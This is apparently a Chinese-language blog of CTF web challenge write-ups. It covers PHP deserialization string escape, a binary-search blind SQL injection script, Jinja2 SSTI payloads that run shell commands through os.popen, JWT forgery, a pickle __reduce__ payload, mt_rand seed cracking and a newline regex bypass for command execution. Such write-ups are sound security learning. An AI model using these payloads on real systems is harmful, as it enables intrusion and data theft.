<p>在profile.php内：<code>$profile=$user-&gt;show_profile($username);</code> &#x3D;&gt; class.php中user类的 show_profile()函数 -&gt; 过滤 &#x3D;&gt; 回来profile.php内， 反序列化，然后进行读取$profile[‘photo’]的值，但photo在update.php文件内 后面有个md5 </p>
<p><code>$profile[&#39;photo&#39;] = &#39;upload/&#39; . md5($file[&#39;name&#39;]);</code> 很明显无法直接传入</p>
<p>-&gt; 有个过滤函数，还有序列化和反序列化，很容易想到 逃逸</p>
<p>-&gt; 看一下过滤函数，有没有我们想要的 preg_match函数  </p>
<blockquote>
<p>$safe &#x3D; array(‘select’, ‘insert’, ‘update’, ‘delete’, ‘where’);<br>$safe &#x3D; ‘&#x2F;‘ . implode(‘|’, $safe) . ‘&#x2F;i’;<br>return preg_replace($safe, ‘hacker’, $string);</p>
</blockquote>
<p>where &#x3D;&gt; hacker   5 -&gt; 6 一个where可以换取一个字符，</p>
<p>-&gt;很明显，我们可以将读取config.php的内容放在 photo前面的那个里面，通过preg_match函数来进行字符串逃逸.</p>
<p>经过测试：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">        <span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$profile</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;phone&#x27;</span> =&gt; <span class="string">&#x27;15839158474&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span> =&gt; <span class="string">&#x27;158@qq.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;nickname&#x27;</span> =&gt; <span class="string">&#x27;&lt;?php  </span></span><br><span class="line"><span class="string">    function filter($string)&#123;</span></span><br><span class="line"><span class="string">        $safe = array(&#x27;</span>select<span class="string">&#x27;, &#x27;</span>insert<span class="string">&#x27;, &#x27;</span>update<span class="string">&#x27;, &#x27;</span>delete<span class="string">&#x27;, &#x27;</span>where<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">        $safe = &#x27;</span>/<span class="string">&#x27; . implode(&#x27;</span>|<span class="string">&#x27;, $safe) . &#x27;</span>/i<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">        return preg_replace($safe, &#x27;</span>hacker<span class="string">&#x27;, $string);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    $profile = array(</span></span><br><span class="line"><span class="string">        &#x27;</span>phone<span class="string">&#x27; =&gt; &#x27;</span><span class="number">15839158474</span><span class="string">&#x27;,</span></span><br><span class="line"><span class="string">        &#x27;</span>email<span class="string">&#x27; =&gt; &#x27;</span><span class="number">158</span>@qq.com<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">        &#x27;</span>nickname<span class="string">&#x27; =&gt; &#x27;</span>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">&quot;;&#125;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;&#x27;,</span></span><br><span class="line"><span class="string">        &#x27;photo&#x27; =&gt; &#x27;upload/21232f297a57a5a743894a0e4a801fc3&#x27;</span></span><br><span class="line"><span class="string">    );</span></span><br><span class="line"><span class="string">    echo filter(serialize(<span class="subst">$profile</span>));&#x27;,</span></span><br><span class="line"><span class="string">        &#x27;photo&#x27; =&gt; &#x27;upload/21232f297a57a5a743894a0e4a801fc3&#x27;</span></span><br><span class="line"><span class="string">    );</span></span><br><span class="line"><span class="string">    echo filter(serialize(<span class="subst">$profile</span>));</span></span><br></pre></td></tr></table></figure></div>

<p>payload：<code>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/piapiapia05.png"></p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/piapiapia06.png"></p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/piapiapia07.png" alt="07"></p>
<h4 id="收获的知识点："><a href="#收获的知识点：" class="headerlink" title="收获的知识点："></a>收获的知识点：</h4><p><strong>1.代码审计能力 初步会使用代码审计软件，将这么多的代码之间的关系理清了七七八八</strong></p>
<p><strong>2.反序列化字符串逃逸的构造能力。（1.闭合 2.调试）</strong></p>
<p><strong>3.文件上传漏洞：并不是能上传成功就说明有这个漏洞，</strong></p>
<p><strong>-&gt;我们需要能够去访问那个上传之后在的路径，</strong></p>
<p><strong>-&gt;并且上传的文件能够被Web容器解释执行（php被Aapche容器执行）,所以文件上传后所在的目录必须是Web容器能够覆盖到的</strong></p>
<hr>
<p>参考：<a class="link" href="https://mayi077.gitee.io/2020/02/01/0CTF-2016-piapiapia/">https://mayi077.gitee.io/2020/02/01/0CTF-2016-piapiapia/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h2><p>这个题是让输入number，最多可以输到4有输出，5就没输出了</p>
<blockquote>
<ol>
<li>有目的去测试过滤了什么 （过滤空格）</li>
</ol>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/%E9%A2%9C%E5%80%BC%E6%9F%A5%E8%AF%A2-00.png"></p>
<p>如果有回显，会是 <code>Hi admin, your score is: 100</code></p>
<p>-&gt; 这句话可以作为我们判断有回显的标志</p>
<p>当输出1时，会有这句话，可以通过布尔盲注</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#二分法 布尔盲注</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://a44d77a2-0e84-4a62-9a6d-92e663b37e72.node5.buuoj.cn:81/?stunum=&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;1^(ascii(substr((select(database())),&#123;i&#125;,1))&gt;&#123;mid&#125;)^1&#x27; #查库名 ctf</span></span><br><span class="line">        <span class="comment"># payload = f&quot;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;ctf&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&quot; #查表名flag,score</span></span><br><span class="line">        <span class="comment"># payload = f&quot;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flag&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&quot;  #查段名flag,value</span></span><br><span class="line">        payload = <span class="string">f&quot;if(ascii(substr((select(value)from(flag)),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)&quot;</span> <span class="comment"># 查字段</span></span><br><span class="line">        r = requests.get(url=url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hi admin, your score is: 100&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></div>



<h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p>看到题目Flask，有印象但不多。</p>
<p>看到笔记和Wp才想起来跟SSTI有关 -&gt; 测试得到的确存在SSTI注入**[jinja2]**</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/04.png"></p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/05.png"></p>
<p>学到一个测试python版本和读取环境变量的payload</p>
<p><code>search=&#123;&#123;"".__class__.__mro__[-1].__subclasses__()[40]&#125;&#125;</code></p>
<p>-&gt;    &lt;type ‘file’&gt;  &#x3D;&gt; 这是python2中有的</p>
<p><code>search=&#123;&#123;config&#125;&#125;</code></p>
<p><strong>过滤了globals   通过字符串拼接绕过</strong></p>
<p>-&gt; 大量回显，看到提示 &#x3D;&gt; flag在当前目录下</p>
<p><code>search=&#123;&#123;''.__class__.__bases__[0].__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__(%27os%27).popen(%27dir%27).read()")&#125;&#125;</code></p>
<p>-&gt; 查目录</p>
<p><code>search=&#123;&#123;''.__class__.__bases__[0].__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__(%27os%27).popen(%27ls /flasklight%27).read()")&#125;&#125;</code></p>
<p>-&gt; 查看 &#x2F;flasklight路径的目录</p>
<p><code>search=&#123;&#123;''.__class__.__bases__[0].__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__(%27os%27).popen(%27cat /flasklight/coomme_geeeett_youur_flek%27).read()")&#125;&#125;</code></p>
<p>-&gt; 读取flag</p>
<h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><p><strong>–抓包改数据 jwt伪造  代码审计 python反序列化</strong></p>
<p><a class="link" href="https://www.cnblogs.com/cjsblog/p/9277677.html">认识jwt <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://1907a1d1-cff6-463b-b02e-360fc3e462ba.node5.buuoj.cn:81/shop?page=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">2000</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    r = requests.get(url + <span class="built_in">str</span>(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>先通过脚本找到 lv6 所在的页数   181</p>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/06.png"></p>
<p>肯定，钱不够，尝试抓包能否修改</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/07.png"></p>
<p>放包之后发现 跳转到 &#x2F;b1g_m4mber页面，只允许admin访问</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/08.png"></p>
<p>这里就涉及了到了伪造admin了（我知道的有 session伪造），这个题是jwt伪造：</p>
<p><a href="https://blog.csdn.net/m0_61025358/article/details/134744252">需要工具<code>c-jwt-cracker</code></a></p>
<p>-&gt; 我看网上wp大部分都是用docker的，不过我这docker不会用，就用另外的一个</p>
<p><a class="link" href="https://jwt.io/">jwt编码网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>抓包获取jwt数据，用工具获得秘钥，在编码网站上修改 username: <code>admin</code>     下面的秘钥为工具找出来 <code>1Kun</code></p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/09.png"></p>
<p>然后左边是实时变化的，更改完成之后，复制左边的，替换抓包中的jwt数据</p>
<p>然后，点购买，进去页面结算抓包，修改折扣和jwt</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/11.png"></p>
<p>然后，并不是结束，源码中有个后门，放了网站的源码  访问下载 审计（python反序列化）</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/12.png"></p>
<p><strong>源码审计</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle <span class="comment"># pickle模块提供了一个简单的持久化功能，可以将对象以文件的形式存放在磁盘上</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AdminHandler</span>(<span class="title class_ inherited__">BaseHandler</span>):</span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>urllib.unquote() 将存入的字典参数 解码 为URL查询字符串</p>
<p>转换成以key1 &#x3D; value1 &amp; key2 &#x3D; value2的形式</p>
</blockquote>
<blockquote>
<p>pickle.loads(urllib.unquote(become)) 从字节对象中读取被封装的对象</p>
<p>类里面的<code>__reduce__python</code>魔术方法会在该类被反序列化的时候会被调用Pickle模块中最常用函数</p>
</blockquote>
<p><code>pickle.dump(obj,file)</code> 序列化函数, 将obj对象序列化到file中</p>
<p><code>pickle.dumps(string)</code>  这是对字符串的序列化</p>
<p><code>pickle.load(file) </code>将file中的对象序列化读出，file是文件名称</p>
<p><code>pickle.loads(string)</code> 这是对字符串的反序列化</p>
<p>检测python反序列化的方法： </p>
<ol>
<li>检查模块 <code>cPickle  pickle</code>，</li>
<li>如果存在这模块，进一步检查 cPickle.loads() pickle.loads()反序列化入口</li>
</ol>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">payload</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">       <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="built_in">print</span> a</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>python2 和 python3 出的结果还不一样。</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/14.png"></p>
<blockquote>
<p> 不进行url编码之前的输出是不一样的，那进行编码之后肯定不一样了。</p>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/16.png"></p>
<blockquote>
<p>这个题要用python2</p>
</blockquote>
<p>点一键成为大会员抓包，在become的参数地方传参，发包就能看到flag了</p>
<p><a class="link" href="https://blog.csdn.net/satasun/article/details/109708593">参考Wp 和python反序列化 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><h4 id="—-伪随机数"><a href="#—-伪随机数" class="headerlink" title="—&gt; 伪随机数"></a>—&gt; 伪随机数</h4><p><a class="link" href="https://www.freebuf.com/vuls/192012.html">大佬文章学习mt_rand()伪随机数 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><code>mt_srand()</code>是设置一个随机数的初始值（种子）</p>
<p><code>mt_rand()</code>是生成随机数</p>
<p><strong>mt_rand()函数</strong></p>
<p>-&gt; 该函数用 Mersenne Twister算法的特性作为随机数发生器，它的平均速度比 libc 提供的 rand() 快四倍</p>
<p>-&gt; 有两个参数 min max 在这两个值中间产生</p>
<p>-&gt; 如果没有可选参数，默认是 0 到 mt_getrandmax() 之间</p>
<p><strong>伪随机数是由确定的算法计算出来的随机数序列 &#x3D;&gt; 若种子不变，伪随机数数序也不会变</strong></p>
<p>&#x3D;&gt; 如果知道种子，或者部分的数序（通过工具算出来种子）</p>
<p>&#x3D;&gt; 那么就可以得到后面的数序</p>
<p><strong>第一次调用mt_rand()函数会检查有没有种子，如果没有种子，通过 mt_srand()产生种子，之后调用，直接用这个种子来生成随机数</strong></p>
<p><strong>php_mt_seed工具</strong>     这是破解mt_rand()函数的seed的工具。</p>
<p><strong>mt_rand的算法从PHP 3.0.6开始就一直在变化，php_mt_seed 4.0 支持以下几个大的版本： PHP 3.0.7 to 5.2.0，PHP 5.2.1 to 7.0.x， and PHP 7.1.0+</strong></p>
<p>基于命令行运行：</p>
<p><strong>一个参数：</strong>mt_rand()函数生成的第一个随机数</p>
<p><strong>两个参数：</strong>代表mt_rand()函数第一次输出是在什么区间内，第一个参数是min  第二个参数是max</p>
<p><strong>四个参数（高级模式）：</strong>前两个参数代表mt_rand()函数第一个数的区间，后两个代表mt_rand()函数输出的区间</p>
<p><strong>多于五个参数：</strong>每四个参数为一组，每一组引用对应的随机数输出 . 最后一组可以是1,2或4个参数</p>
<h4 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h4><p>环境页面，给我们了10位字符串，让我们猜后面的10位，如果猜对就有flag，随便看了看源码</p>
<p>发现有<code>check.php</code>页面 &#x3D;&gt; 访问</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/18.png"></p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/19.png"></p>
<p>这是一个伪随机数生成的过程，而我们已经知道了前10位，利用工具来得到种子，从而算出全部字符</p>
<p><code>在用工具之前，要将已知的十个字符转换成 符合工具的数字形式</code></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">str1 = <span class="string">&quot;Q0vJS9XCju&quot;</span></span><br><span class="line">str2 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">result =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">length = <span class="built_in">str</span>(<span class="built_in">len</span>(str2)-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(str1)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(str2)):</span><br><span class="line">        <span class="keyword">if</span> str1[i] ==  str2[j]:</span><br><span class="line">            result += <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> +<span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27; &#x27;</span> + length + <span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></div>

<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/17.png"></p>
<p>找到种子之后，通过代码生成随机数序，这个过程可以参考check.php的代码</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">348806110</span>); <span class="comment"># 通过工具获得的种子</span></span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=<span class="title function_ invoke__">substr</span>(<span class="variable">$str_long1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure></div>

<p>然后将生成的结果提交即可</p>
<p><strong>注意：要注意php版本的问题，如果php版本满足要求，生成的随机数序是不对的。</strong></p>
<p><strong>PHP版本要大于7.1</strong></p>
<h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p>这个题看Wp说有源码泄露</p>
<ul>
<li><input disabled type="checkbox"> 代码审计</li>
<li><input disabled type="checkbox"> preg_match()函数的理解</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"><span class="comment"># 这行代码是用来在运行中的shell环境中修改环境变量的. =&gt; 这行代码将PATH环境变量设置为 /home/rceserivice/jail</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$json</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">is_string</span>(<span class="variable">$json</span>)) &#123;	<span class="comment"># 检查$json变量是不是一个字符串</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cmd</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>环境变量的概念：</p>
<p>操作系统用来存储关于系统运行时信息的数据，这些信息可以被操作系统和执行的程序访问。PATH环境变量特别用于查找执行文件（例如程序或脚本）的位置。<strong>当你在Shell中输入一个命令时，操作系统会依次检查PATH变量中列出的目录，直到找到对应的执行文件。</strong></p>
</blockquote>
<p>法1： 用换行符（%0A）绕过正则匹配:</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/00.png"></p>
<p><strong>环境变量被设置到 &#x2F;home&#x2F;rceservice&#x2F;jail的位置了，所以我们要通过绝对路径来运行 cat命令</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%0A&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;%0A&#125;</span><br></pre></td></tr></table></figure></div>



<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/01-1711388632880.png"></p>
<p>法2：<a class="link" href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">preg_match()函数的最大回溯次数限制 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>正则表达式是一个可以被“有限状态自动机”接受的语言类。</p>
<p>常见的正则引擎又被细分为，DFA(确定性有限状态自动机) 与 NFA(非确定性有限状态自动机)</p>
<p>DFA：从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入</p>
<p>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态</p>
<p><strong>PHP的pcre.backtrack_limit限制利用</strong></p>
<p>PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限<code>pcre.backtrack_limit</code>。我们可以通过<code>var_dump(ini_get(&#39;pcre.backtrack_limit&#39;));</code>的方式查看当前环境下的上限：</p>
<p><code>php -a</code>进入shell模式</p>
